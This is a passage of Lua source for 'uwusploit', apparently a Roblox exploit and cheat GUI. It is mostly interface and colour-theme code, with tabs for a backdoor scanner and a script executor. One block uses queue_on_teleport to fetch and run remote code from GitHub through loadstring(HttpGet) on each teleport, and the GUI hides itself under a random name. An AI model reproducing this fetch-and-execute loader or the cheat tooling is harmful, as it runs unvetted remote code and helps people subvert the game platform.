--[[---------------------------------------------------------------------------------------------------------------------------
  __  __     __     __     __  __     ______     ______   __         ______     __     _______ 
 /\ \/\ \   /\ \  _ \ \   /\ \/\ \   /\  ___\   /\  __ \ /\ \       /\  __ \   /\ \   /\__  __\ 
 \ \ \_\ \  \ \ \/ ".\ \  \ \ \_\ \  \ \___  \  \ \  __/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \_/ 
  \ \_____\  \ \__/".~\_\  \ \_____\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\ 
   \/_____/   \/_/   \/_/   \/_____/   \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_/ 
                                                                                                       
   Made by Team Noxious, Team Occulence & Team Symphysis -- uwusploit [Version 6]
   
---------------------------------------------------------------------------------------------------------------------------]]--

if _G.uwusploitloaded == true then return end _G.uwusploitloaded = true

-------------------------------------------------------------------------------------------------------------------------------

t = task.wait t(0.5) uwu = {} -- 7/28/2025: now open sourced!!! yay!!! skidders rejoice!!! (friendly fire)

-------------------------------------------------------------------------------------------------------------------------------

uwu["version"] = "6"
uwu["workspace"] = game.Workspace
uwu["user input service"] = game:GetService("UserInputService")
uwu["players"] = game:GetService("Players")
uwu["local player"] = uwu["players"].LocalPlayer
uwu["player gui"] = uwu["local player"]:FindFirstChildWhichIsA("PlayerGui")
uwu["user input service"] = game:GetService("UserInputService")
uwu["tween service"] = game:GetService("TweenService")
uwu["http service"] = game:GetService("HttpService")
uwu["marketplace service"] = game:GetService("MarketplaceService")
uwu["run service"] = game:GetService("RunService")
uwu["teleport service"] = game:GetService("TeleportService")
uwu["starter gui"] = game:GetService("StarterGui")
uwu["gui service"] = game:GetService("GuiService")
uwu["lighting"] = game:GetService("Lighting")
uwu["context action service"] = game:GetService("ContextActionService")
uwu["network client"] = game:GetService("NetworkClient")
uwu["replicated storage"] = game:GetService("ReplicatedStorage")
uwu["group service"] = game:GetService("GroupService")
uwu["pathfinding service"] = game:GetService("PathfindingService")
uwu["sound service"] = game:GetService("SoundService")
uwu["teams"] = game:GetService("Teams")
uwu["starter player"] = game:GetService("StarterPlayer")
uwu["insert service"] = game:GetService("InsertService")
uwu["chat"] = game:GetService("Chat")
uwu["proximity prompt service"] = game:GetService("ProximityPromptService")
uwu["stats"] = game:GetService("Stats")
uwu["material service"] = game:GetService("MaterialService")
uwu["avatar editor service"] = game:GetService("AvatarEditorService")
uwu["text chat service"] = game:GetService("TextChatService")
uwu["unlocked"] = false
uwu["is mobile?"] = game:GetService("UserInputService").TouchEnabled
uwu["in studio"] = uwu["run service"]:IsStudio()

if not uwu["in studio"] then
	uwu["local player"].OnTeleport:Connect(function(State)
		qtp = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
		qtp([[loadstring(game:HttpGet("https://github.com/Boxten-Keyes/box-01/blob/main/box%23%5Buwusploit%5D/box%23%5Bmain%5D.lua"))()]])
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

function grs(l)
	local chars = {"▓", "▒", "░"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

function grs2(l)
	local chars = {"1", "0"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

function grs3(l)
	local chars = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["screen gui"] = Instance.new("ScreenGui")
uwu["screen gui"].Name = grs3(50) 
uwu["screen gui"].ResetOnSpawn = false

if uwu["in studio"] then
	uwu["screen gui"].Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
else
	uwu["screen gui"].Parent = gethui and gethui() or game:GetService("CoreGui")
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab top bar"] = Instance.new("TextLabel")
uwu["donut tab top bar close button"] = Instance.new("TextButton")
uwu["donut tab top bar minimize button"] = Instance.new("TextButton")
uwu["donut tab top bar reposition button"] = Instance.new("TextButton")
uwu["donut tab top bar"] = Instance.new("TextLabel")
uwu["donut tab top bar close button"] = Instance.new("TextButton")
uwu["donut tab top bar minimize button"] = Instance.new("TextButton")
uwu["donut tab top bar reposition button"] = Instance.new("TextButton")
uwu["donut tab main frame 1"] = Instance.new("Frame")
uwu["donut tab block all"] = Instance.new("Frame")
uwu["donut tab block main frame"] = Instance.new("Frame")
uwu["donut"] = Instance.new("TextLabel")

-------------------------------------------------------------------------------------------------------------------------------

uwu["binary tab top bar"] = Instance.new("TextLabel")
uwu["binary tab top bar close button"] = Instance.new("TextButton")
uwu["binary tab top bar minimize button"] = Instance.new("TextButton")
uwu["binary tab top bar reposition button"] = Instance.new("TextButton")
uwu["binary tab top bar"] = Instance.new("TextLabel")
uwu["binary tab top bar close button"] = Instance.new("TextButton")
uwu["binary tab top bar minimize button"] = Instance.new("TextButton")
uwu["binary tab top bar reposition button"] = Instance.new("TextButton")
uwu["binary tab main frame 1"] = Instance.new("Frame")
uwu["binary tab block all"] = Instance.new("Frame")
uwu["binary tab block main frame"] = Instance.new("Frame")
uwu["binary"] = Instance.new("TextLabel")

-------------------------------------------------------------------------------------------------------------------------------

uwu["video tab top bar"] = Instance.new("TextLabel")
uwu["video tab top bar close button"] = Instance.new("TextButton")
uwu["video tab top bar minimize button"] = Instance.new("TextButton")
uwu["video tab top bar reposition button"] = Instance.new("TextButton")
uwu["video tab top bar"] = Instance.new("TextLabel")
uwu["video tab top bar close button"] = Instance.new("TextButton")
uwu["video tab top bar minimize button"] = Instance.new("TextButton")
uwu["video tab top bar reposition button"] = Instance.new("TextButton")
uwu["video tab main frame 1"] = Instance.new("Frame")
uwu["video tab block all"] = Instance.new("Frame")
uwu["video tab block main frame"] = Instance.new("Frame")
uwu["video"] = Instance.new("VideoFrame")
uwu["video id textbox"] = Instance.new("TextBox")
uwu["video id enter"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab top bar"] = Instance.new("TextLabel")
uwu["gaydar tab top bar close button"] = Instance.new("TextButton")
uwu["gaydar tab top bar minimize button"] = Instance.new("TextButton")
uwu["gaydar tab top bar reposition button"] = Instance.new("TextButton")
uwu["gaydar tab top bar"] = Instance.new("TextLabel")
uwu["gaydar tab top bar close button"] = Instance.new("TextButton")
uwu["gaydar tab top bar minimize button"] = Instance.new("TextButton")
uwu["gaydar tab top bar reposition button"] = Instance.new("TextButton")
uwu["gaydar tab main frame 1"] = Instance.new("Frame")
uwu["gaydar tab block all"] = Instance.new("Frame")
uwu["gaydar tab block main frame"] = Instance.new("Frame")
uwu["gaydar"] = Instance.new("ImageLabel")
uwu["gaydar scan"] = Instance.new("TextButton")
uwu["gaydar info"] = Instance.new("TextLabel")
uwu["gaydar target"] = Instance.new("TextBox")

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab top bar"] = Instance.new("TextLabel")
uwu["headcanon generator tab top bar close button"] = Instance.new("TextButton")
uwu["headcanon generator tab top bar minimize button"] = Instance.new("TextButton")
uwu["headcanon generator tab top bar reposition button"] = Instance.new("TextButton")
uwu["headcanon generator tab top bar"] = Instance.new("TextLabel")
uwu["headcanon generator tab top bar close button"] = Instance.new("TextButton")
uwu["headcanon generator tab top bar minimize button"] = Instance.new("TextButton")
uwu["headcanon generator tab top bar reposition button"] = Instance.new("TextButton")
uwu["headcanon generator tab main frame 1"] = Instance.new("Frame")
uwu["headcanon generator tab block all"] = Instance.new("Frame")
uwu["headcanon generator tab block main frame"] = Instance.new("Frame")
uwu["headcanon generator output"] = Instance.new("TextLabel")
uwu["headcanon generator input"] = Instance.new("TextBox")
uwu["headcanon generator input 2"] = Instance.new("TextBox")
uwu["generate headcanon"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab top bar"] = Instance.new("TextLabel")
uwu["message reverser tab top bar close button"] = Instance.new("TextButton")
uwu["message reverser tab top bar minimize button"] = Instance.new("TextButton")
uwu["message reverser tab top bar reposition button"] = Instance.new("TextButton")
uwu["message reverser tab top bar"] = Instance.new("TextLabel")
uwu["message reverser tab top bar close button"] = Instance.new("TextButton")
uwu["message reverser tab top bar minimize button"] = Instance.new("TextButton")
uwu["message reverser tab top bar reposition button"] = Instance.new("TextButton")
uwu["message reverser tab main frame 1"] = Instance.new("Frame")
uwu["message reverser tab block all"] = Instance.new("Frame")
uwu["message reverser tab block main frame"] = Instance.new("Frame")
uwu["message reverser input"] = Instance.new("TextBox")
uwu["reverse message"] = Instance.new("TextButton")
uwu["clear message reverser input"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab top bar"] = Instance.new("TextLabel")
uwu["k12 encoder and decoder tab top bar close button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab top bar minimize button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab top bar reposition button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab top bar"] = Instance.new("TextLabel")
uwu["k12 encoder and decoder tab top bar close button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab top bar minimize button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab top bar reposition button"] = Instance.new("TextButton")
uwu["k12 encoder and decoder tab main frame 1"] = Instance.new("Frame")
uwu["k12 encoder and decoder tab block all"] = Instance.new("Frame")
uwu["k12 encoder and decoder tab block main frame"] = Instance.new("Frame")
uwu["k12 encoder and decoder input"] = Instance.new("TextBox")
uwu["k12 encode"] = Instance.new("TextButton")
uwu["k12 decode"] = Instance.new("TextButton")
uwu["clear k12 encoder and decoder input"] = Instance.new("TextButton")
uwu["copy k12 encoder and decoder input"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

uwu["wm"] = Instance.new("TextLabel")
uwu["toggle interface visibility button"] = Instance.new("TextButton")
uwu["top bar"] = Instance.new("TextLabel")
uwu["top bar close button"] = Instance.new("TextButton")
uwu["top bar minimize button"] = Instance.new("TextButton")
uwu["top bar reposition button"] = Instance.new("TextButton")

-------------------------------------------------------------------------------------------------------------------------------

uwu["block all"] = Instance.new("Frame")
uwu["main frame 1"] = Instance.new("Frame")
uwu["main frame 2"] = Instance.new("Frame")
uwu["main frame 3"] = Instance.new("Frame")
uwu["main frame 4"] = Instance.new("Frame")
uwu["block main frame"] = Instance.new("Frame")
uwu["introduction"] = Instance.new("TextLabel")
uwu["player information tab"] = Instance.new("TextButton")
uwu["server information tab"] = Instance.new("TextButton")
uwu["console output tab"] = Instance.new("TextButton")
uwu["console label"] = Instance.new("TextLabel")
uwu["output holder"] = Instance.new("Frame")
uwu["output scrolling frame"] = Instance.new("ScrollingFrame")
uwu["output textbox"] = Instance.new("TextBox")
uwu["clear console button"] = Instance.new("TextButton")
uwu["server information holder"] = Instance.new("TextLabel")
uwu["information holder"] = Instance.new("TextLabel")
uwu["information pfp"] = Instance.new("ImageLabel")
uwu["script settings tab"] = Instance.new("TextButton")
uwu["server settings tab"] = Instance.new("TextButton")
uwu["server settings holder"] = Instance.new("Frame")
uwu["change fps cap"] = Instance.new("TextLabel")
uwu["change fps cap setting"] = Instance.new("TextButton")
uwu["change fps cap textbox"] = Instance.new("TextBox")
uwu["rejoin server"] = Instance.new("TextButton")
uwu["leave game"] = Instance.new("TextButton")
uwu["server hop"] = Instance.new("TextButton")
uwu["auto rejoin toggle"] = Instance.new("TextLabel")
uwu["toggle auto rejoin on"] = Instance.new("TextButton")
uwu["toggle auto rejoin off"] = Instance.new("TextButton")
uwu["script settings holder"] = Instance.new("Frame")
uwu["current theme"] = Instance.new("TextLabel")
uwu["change theme setting"] = Instance.new("TextButton")
uwu["command prefix"] = Instance.new("TextLabel")
uwu["change command prefix setting"] = Instance.new("TextButton")
uwu["change command prefix textbox"] = Instance.new("TextBox")
uwu["change click sound setting"] = Instance.new("TextLabel")
uwu["change click sound"] = Instance.new("TextButton")
uwu["change click sound textbox"] = Instance.new("TextBox")
uwu["backdoor info"] = Instance.new("TextButton")
uwu["backdoor info holder"] = Instance.new("TextLabel")
uwu["scanning"] = Instance.new("TextButton")
uwu["logs holder"] = Instance.new("Frame")
uwu["logs label"] = Instance.new("TextLabel")
uwu["logs scrolling frame"] = Instance.new("ScrollingFrame")
uwu["logs textbox"] = Instance.new("TextBox")
uwu["backdoor scan button"] = Instance.new("TextButton")
uwu["credits"] = Instance.new("TextButton")
uwu["credits holder"] = Instance.new("TextLabel")
uwu["scripts tab"] = Instance.new("TextButton")
uwu["button holder"] = Instance.new("Frame")
uwu["next page"] = Instance.new("TextButton")
uwu["previous page"] = Instance.new("TextButton")
uwu["script search bar"] = Instance.new("TextBox")
uwu["commands tab"] = Instance.new("TextButton")
uwu["list of commands"] = Instance.new("ScrollingFrame")
uwu["command bar"] = Instance.new("TextBox")
uwu["execute command button"] = Instance.new("TextButton")
uwu["asset ids tab"] = Instance.new("TextButton")
uwu["asset id type indicator"] = Instance.new("TextLabel")
uwu["asset id search bar"] = Instance.new("TextBox")
uwu["switch asset id type button"] = Instance.new("TextButton")
uwu["switch asset id type button 2"] = Instance.new("TextButton")
uwu["asset image 1"] = Instance.new("ImageLabel")
uwu["asset image name 1"] = Instance.new("TextLabel")
uwu["asset image id 1"] = Instance.new("TextLabel")
uwu["copy asset id 1 button"] = Instance.new("TextButton")
uwu["asset image 2"] = Instance.new("ImageLabel")
uwu["asset image name 2"] = Instance.new("TextLabel")
uwu["asset image id 2"] = Instance.new("TextLabel")
uwu["copy asset id 2 button"] = Instance.new("TextButton")
uwu["asset image 3"] = Instance.new("ImageLabel")
uwu["asset image name 3"] = Instance.new("TextLabel")
uwu["asset image id 3"] = Instance.new("TextLabel")
uwu["copy asset id 3 button"] = Instance.new("TextButton")
uwu["next page 2 button"] = Instance.new("TextButton")
uwu["previous page 2 button"] = Instance.new("TextButton")
uwu["executor tab"] = Instance.new("TextButton")
uwu["executor scrolling frame"] = Instance.new("ScrollingFrame")
uwu["executor textbox"] = Instance.new("TextBox")
uwu["execute button"] = Instance.new("TextButton")
uwu["execute from client button"] = Instance.new("TextButton")
uwu["clear button"] = Instance.new("TextButton")
uwu["player information tab bottom cover"] = Instance.new("Frame")
uwu["server information tab bottom cover"] = Instance.new("Frame")
uwu["console output tab bottom cover"] = Instance.new("Frame")
uwu["script settings tab bottom cover"] = Instance.new("Frame")
uwu["server settings tab bottom cover"] = Instance.new("Frame")
uwu["backdoor info bottom cover"] = Instance.new("Frame")
uwu["scanning bottom cover"] = Instance.new("Frame")
uwu["credits bottom cover"] = Instance.new("Frame")
uwu["scripts tab bottom cover"] = Instance.new("Frame")
uwu["commands tab bottom cover"] = Instance.new("Frame")
uwu["asset ids tab bottom cover"] = Instance.new("Frame")
uwu["executor tab bottom cover"] = Instance.new("Frame")

-------------------------------------------------------------------------------------------------------------------------------

uwu["password label"] = Instance.new("TextLabel")
uwu["password frame"] = Instance.new("Frame")
uwu["password text"] = Instance.new("TextLabel")
uwu["password box"] = Instance.new("TextBox")
uwu["password check button"] = Instance.new("TextButton")
uwu["password bullet label"] = Instance.new("TextLabel")
uwu["password fake cursor"] = Instance.new("TextLabel")

-------------------------------------------------------------------------------------------------------------------------------

uwu["emoticon"] = "o.o"

grayscaletheme = false
noxioustheme = false
c00l2theme = false
c00ltheme = false
lighttheme = false
polariatheme = false

local initialcols = {
	background = Color3.fromHex("252539"),
	border = Color3.fromHex("4051ED"),
	half = Color3.fromHex("858585"),
	half2 = Color3.fromHex("303db3"),
	white = Color3.fromHex("FFFFFF"),
	text = Color3.fromHex("ededed")
}

uwu["default background color"] = initialcols.background
uwu["default border color"] = initialcols.border
uwu["default 1/2 color"] = initialcols.half
uwu["default 1/2 color 2"] = initialcols.half2
uwu["default text color"] = initialcols.text
uwu["default text font"] = Enum.Font.RobotoMono

function sdfont(font)
	if typeof(font) == "EnumItem" and font.EnumType == Enum.Font then
		uwu["default text font"] = font
	end
end

local hues = 0.002

function shiftcol(color)
	local h, s, v = color:ToHSV()
	return Color3.fromHSV((h + hues) % 1, s, v)
end

function grayscale(color)
	local luminance = 0.2126 * color.R + 0.7152 * color.G + 0.0722 * color.B
	return Color3.new(luminance, luminance, luminance)
end

donuttabreallyminimized = false
binarytabreallyminimized = false
hcgentabreallyminimized = false
gaydartabreallyminimized = false
videotabreallyminimized = false
msgrevtabreallyminimized = false
k12tabreallyminimized = false

function grayscalecols()
	uwu["default background color"] = grayscale(initialcols.background)
	uwu["default border color"] = grayscale(initialcols.border)
	uwu["default text color"] = grayscale(initialcols.border)
	uwu["default 1/2 color 2"] = grayscale(initialcols.half2)
	uwu["default 1/2 color"] = grayscale(initialcols.half2)
	sdfont(Enum.Font.RobotoMono)
	uwu["top bar"].Text = " [v" .. uwu["version"] .. "] uwusploit " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = " donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = " binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = " binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = " gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = " gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = " video.lua >.<"
	else
		uwu["video tab top bar"].Text = " video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = " message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = " message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua o.o"
	end
end

function noxiouscols()
	uwu["default background color"] = Color3.new(0, 0, 0)
	uwu["default border color"] = Color3.new(1, 1, 1)
	uwu["default text color"] = Color3.new(1, 1, 1)
	uwu["default 1/2 color 2"] = Color3.new(0.5, 0.5, 0.5)
	uwu["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.Nunito)
	uwu["top bar"].Text = "  [v" .. uwu["version"] .. "] uwusploit " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = "  donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = "  donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = "  binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = "  binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = "  headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = "  headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = "  gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = "  gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = "  video.lua >.<"
	else
		uwu["video tab top bar"].Text = "  video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = "  message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = "  message reverser.lua o.o"
	end	
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = "  k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = "  k12 encoder and decoder.lua o.o"
	end
end

function polariacols()
	uwu["default background color"] = Color3.new(0, 0, 0)
	uwu["default text color"] = Color3.new(1, 1, 1)
	uwu["default border color"] = Color3.new(0.5, 0, 1)
	uwu["default 1/2 color 2"] = Color3.new(0.25, 0, 0.5)
	uwu["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.Arimo)
	uwu["top bar"].Text = "  [v" .. uwu["version"] .. "] polaria reborn " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = "  donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = "  donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = "  binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = "  binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = "  headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = "  headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = "  gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = "  gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = "  video.lua >.<"
	else
		uwu["video tab top bar"].Text = "  video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = "  message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = "  message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = "  k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = "  k12 encoder and decoder.lua o.o"
	end
end

function c00l2cols()
	uwu["default background color"] = Color3.new(0, 0, 0)
	uwu["default text color"] = Color3.new(1, 1, 1)
	uwu["default border color"] = initialcols.border
	uwu["default 1/2 color 2"] = initialcols.half2
	uwu["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.SourceSans)
	uwu["top bar"].Text = "   [v" .. uwu["version"] .. "] c00lgui reborn " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = "   donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = "   donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = "   binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = "   binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = "   headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = "   headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = "   gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = "   gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = "   video.lua >.<"
	else
		uwu["video tab top bar"].Text = "   video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = "   message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = "   message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = "   k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = "   k12 encoder and decoder.lua o.o"
	end
end

function c00lcols()
	uwu["default background color"] = Color3.new(0, 0, 0)
	uwu["default text color"] = Color3.new(1, 1, 1)
	uwu["default border color"] = Color3.new(1, 0, 0)
	uwu["default 1/2 color 2"] = Color3.new(0.5, 0, 0)
	uwu["default 1/2 color"] = Color3.new(0.5, 0.5, 0.5)
	sdfont(Enum.Font.SourceSans)
	uwu["top bar"].Text = "   [v" .. uwu["version"] .. "] c00lgui reborn " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = "   donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = "   donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = "   binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = "   binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = "   headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = "   headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = "   gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = "   gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = "   video.lua >.<"
	else
		uwu["video tab top bar"].Text = "   video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = "   message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = "   message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = "   k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = "   k12 encoder and decoder.lua o.o"
	end
end

function lightcols()
	uwu["default background color"] = Color3.fromHex("d0d4f7")
	uwu["default border color"] = initialcols.border
	uwu["default 1/2 color"] = Color3.fromHex("919aeb")
	uwu["default 1/2 color 2"] = Color3.fromHex("919aeb")
	uwu["default text color"] = initialcols.border
	sdfont(Enum.Font.RobotoMono)
	uwu["top bar"].Text = " [v" .. uwu["version"] .. "] uwusploit " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = " donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = " binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = " binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = " gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = " gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = " video.lua >.<"
	else
		uwu["video tab top bar"].Text = " video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = " message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = " message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua o.o"
	end
end

function restorecols()
	uwu["default background color"] = initialcols.background
	uwu["default border color"] = initialcols.border
	uwu["default 1/2 color"] = initialcols.half
	uwu["default 1/2 color 2"] = initialcols.half2
	uwu["default text color"] = initialcols.text
	sdfont(Enum.Font.RobotoMono)
	uwu["top bar"].Text = " [v" .. uwu["version"] .. "] uwusploit " .. uwu["emoticon"]
	if donuttabreallyminimized then
		uwu["donut tab top bar"].Text = " donut.lua >.<"
	else
		uwu["donut tab top bar"].Text = " donut.lua o.o"
	end
	if binarytabreallyminimized then
		uwu["binary tab top bar"].Text = " binary.lua >.<"
	else
		uwu["binary tab top bar"].Text = " binary.lua o.o"
	end
	if hcgentabreallyminimized then
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua >.<"
	else
		uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
	end
	if gaydartabreallyminimized then
		uwu["gaydar tab top bar"].Text = " gaydar.lua >.<"
	else
		uwu["gaydar tab top bar"].Text = " gaydar.lua o.o"
	end
	if videotabreallyminimized then
		uwu["video tab top bar"].Text = " video.lua >.<"
	else
		uwu["video tab top bar"].Text = " video.lua o.o"
	end
	if msgrevtabreallyminimized then
		uwu["message reverser tab top bar"].Text = " message reverser.lua >.<"
	else
		uwu["message reverser tab top bar"].Text = " message reverser.lua o.o"
	end
	if k12tabreallyminimized then
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua >.<"
	else
		uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua o.o"
	end
end

function applycurrenttheme()
	if grayscaletheme then
		grayscalecols()
	elseif noxioustheme then
		noxiouscols()
	elseif c00l2theme then
		c00l2cols()
	elseif c00ltheme then
		c00lcols()
	elseif lighttheme then
		lightcols()
	elseif polariatheme then
		polariacols()
	else
		restorecols()
	end
end

function applycols(object)
	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("Frame") or object:IsA("ScrollingFrame") or object:IsA("TextBox") or object:IsA("ImageLabel") or object:IsA("VideoFrame") then
		object.BackgroundColor3 = uwu["default background color"]
		object.BorderColor3 = uwu["default border color"]
	end

	if object:IsA("TextButton") or object:IsA("TextLabel") or object:IsA("TextBox") then
		object.TextColor3 = uwu["default text color"]
		object.Font = uwu["default text font"]
	end

	if object:IsA("TextBox") then
		object.PlaceholderColor3 = uwu["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "backdoor" then
		object.TextColor3 = uwu["default background color"]
		object.TextStrokeColor3 = uwu["default border color"]
	end

	if object:IsA("TextLabel") and object.Name == "fakebutton" or object.Name == "epico" then
		object.TextColor3 = uwu["default 1/2 color"]
		object.BorderColor3 = uwu["default 1/2 color 2"]
	end

	if object:IsA("ImageLabel") and object.Name == "epicob" then
		object.BorderColor3 = uwu["default 1/2 color 2"]
	end

	if object:IsA("TextLabel") and object.Name == "fakebuttonlabel" then
		object.TextColor3 = uwu["default 1/2 color"]
	end

	if object:IsA("TextLabel") and object.Name == "stay" then
		object.Font = Enum.Font.RobotoMono
	end

	if object:IsA("TextLabel") and object.Name == "fakebox" then
		local txtlength = #uwu["password box"].Text

		if uwu["typing"] == false then
			if txtlength == 0 then
				object.TextColor3 = uwu["default 1/2 color"]
			else
